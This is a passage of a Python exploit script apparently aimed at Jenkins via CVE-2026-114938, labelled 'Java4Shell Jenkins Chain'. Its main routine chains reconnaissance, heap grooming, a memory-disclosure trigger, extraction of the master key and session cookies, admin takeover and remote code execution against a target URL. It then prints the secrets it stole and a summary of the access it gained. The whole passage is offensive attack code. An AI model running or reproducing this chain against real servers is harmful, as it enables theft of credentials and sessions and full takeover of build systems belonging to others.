    parser.add_argument("--jdk17", action="store_true",
                        help="Use JDK 17 trigger (129-byte payload)")
    args = parser.parse_args()

    creds_b64 = base64.b64encode(args.creds.encode()).decode()
    trigger_b64 = TRIGGER_B64_JDK17 if args.jdk17 else TRIGGER_B64
    timer = Timer()

    # ── Banner ──
    print()
    print(f"  {CYAN}╔═══════════════════════════════════════════════════════════╗{NC}")
    print(f"  {CYAN}║  Java4Shell Jenkins Chain — CVE-2026-114938               ║{NC}")
    print(f"  {CYAN}║  RECON > WARM > GROOM > JAVABLEED > TAKEOVER > RCE       ║{NC}")
    print(f"  {CYAN}╚═══════════════════════════════════════════════════════════╝{NC}")
    print()
    print(f"  {WHITE}JENKINS  //  {args.url}{NC}")
    print(f"  {DIM}SPRAY   {args.spray} x {args.attempts} attempts{NC}")
    if args.jdk17:
        print(f"  {YELLOW}TRIGGER JDK 17 mode (129-byte payload){NC}")
    print()

    milestones = {
        "master_key": False,
        "session_hijack": False,
        "admin_access": False,
        "rce": False,
    }

    # ── Phase 1: RECON ──
    jk_info = phase_recon(timer, args.url)
    if not jk_info:
        timer.log("!", "Jenkins not reachable")
        return

    # ── Phase 2: WARM ──
    warm_ok, warm_rtts = phase_warm(timer, args.url, creds_b64,
                                     args.warmup)
    if warm_ok == 0:
        timer.log("!", "Warmup failed — check credentials")
        return

    # ── Phase 3: REHEARSE ──
    rehearsal_rtts = phase_rehearse(timer, args.url, creds_b64)
    avg_rtt = (sum(rehearsal_rtts) / len(rehearsal_rtts)
               if rehearsal_rtts else 1.0)

    # ── Phase 4+5: GROOM + TRIGGER ──
    leaked_data = phase_groom_trigger(
        timer, args.url, creds_b64,
        spray_size=args.spray,
        max_attempts=args.attempts,
        avg_rtt_ms=avg_rtt,
        trigger_b64=trigger_b64)

    if not leaked_data:
        timer.log("~", "No heap disclosure achieved")
        timer.log("~", "Possible causes:")
        timer.log("~", "  - CPU lacks AVX-512 VBMI (required)")
        timer.log("~", "  - JDK is patched")
        timer.log("~", "  - Heap layout never aligned (increase --attempts)")
        _print_summary(timer, milestones)
        return

    # ── Phase 6: JAVABLEED ──
    secrets = find_jenkins_secrets(timer, leaked_data)

    if secrets.get("master_key"):
        milestones["master_key"] = True
    if secrets.get("session_cookies"):
        milestones["session_hijack"] = True

    total_secrets = sum(len(v) for v in secrets.values())
    if total_secrets == 0:
        timer.log("~", "No exploitable secrets found in leaked data")
        _print_summary(timer, milestones)
        return

    # ── Phase 7: TAKEOVER ──
    access = phase_takeover(timer, args.url, secrets)

    if access:
        milestones["admin_access"] = True
        timer.log("+", f"{GREEN}Admin access via {access['method']}{NC} "
                       f"— user '{access['user']}'")

        # ── Phase 8: RCE ──
        rce_ok = phase_rce(timer, args.url, access, args.username)
        if rce_ok:
            milestones["rce"] = True
    else:
        timer.log("~", "Could not gain direct admin access")
        timer.log("~", "Leaked secrets dumped for manual exploitation:")
        for cat, items in secrets.items():
            if items:
                for item in items[:3]:
                    val = (item.get("key_hex", "") or
                           item.get("value", "") or "")
                    timer.log("~", f"  [{cat}] {val[:64]}...")

    # ── Summary ──
    _print_summary(timer, milestones)


def _print_summary(timer, milestones):
    elapsed = timer.elapsed()

    print()
    access_level = "NONE"
    if milestones["rce"]:
        access_level = "ADMIN + RCE"
    elif milestones["admin_access"]:
        access_level = "ADMIN"
    elif milestones["session_hijack"]:
        access_level = "SESSION"
    elif milestones["master_key"]:
        access_level = "MASTER KEY"

    print(f"  ELAPSED   {timer.fmt(elapsed)}"
          f"          ACCESS  {access_level}")
    print(f"  ATTEMPTS  {timer.try_count:02d}")
    print()

    def ms(label, done):
        return (f"{GREEN}■ {label}{NC}" if done
                else f"{DIM}□ {label}{NC}")

    print(f"  {ms('MASTER KEY', milestones['master_key'])}    "
          f"{ms('SESSION HIJACK', milestones['session_hijack'])}    "
          f"{ms('ADMIN ACCESS', milestones['admin_access'])}    "
          f"{ms('RCE', milestones['rce'])}")
    print()


if __name__ == "__main__":
    main()
